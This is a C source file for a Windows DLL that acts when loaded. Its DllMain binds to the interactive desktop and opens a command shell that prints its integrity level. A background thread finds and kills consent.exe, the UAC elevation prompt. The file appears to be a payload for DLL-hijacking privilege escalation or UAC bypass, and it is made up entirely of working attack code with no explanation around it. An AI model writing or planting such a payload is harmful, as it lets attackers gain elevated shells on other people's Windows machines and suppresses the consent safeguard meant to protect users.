#define _WIN32_WINNT 0x0A00
#define WINVER 0x0A00

#include <windows.h>
#include <TlHelp32.h>
#include <string.h>
#include <wchar.h>

#ifndef DESKTOP_ALL_ACCESS
#define DESKTOP_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | DESKTOP_READOBJECTS | \
	DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU | DESKTOP_HOOKCONTROL | \
	DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK | DESKTOP_ENUMERATE | \
	DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP)
#endif

static DWORD WINAPI KillConsent(LPVOID unused)
{
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) return 0;
	PROCESSENTRY32 pe = { 0 };
	pe.dwSize = sizeof(pe);
	if (Process32First(snap, &pe))
	{
		do {
			if (!lstrcmpiA(pe.szExeFile, "consent.exe"))
			{
				HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
				if (h) { TerminateProcess(h, 0); CloseHandle(h); }
			}
		} while (Process32Next(snap, &pe));
	}
	CloseHandle(snap);
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
	if (reason != DLL_PROCESS_ATTACH)
		return TRUE;

	DisableThreadLibraryCalls(hInst);

	HWINSTA ws = OpenWindowStationW(L"WinSta0", FALSE, WINSTA_ALL_ACCESS);
	if (ws) SetProcessWindowStation(ws);

	HDESK dsk = OpenInputDesktop(0, FALSE, DESKTOP_ALL_ACCESS);
	if (dsk) SetThreadDesktop(dsk);

	STARTUPINFOW si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = { 0 };
	WCHAR cmd[] = L"cmd.exe /k whoami /groups | findstr /i mandatory";
	if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}

	DWORD tid = 0;
	HANDLE t = CreateThread(NULL, 0, KillConsent, NULL, 0, &tid);
	if (t) CloseHandle(t);

	return TRUE;
}
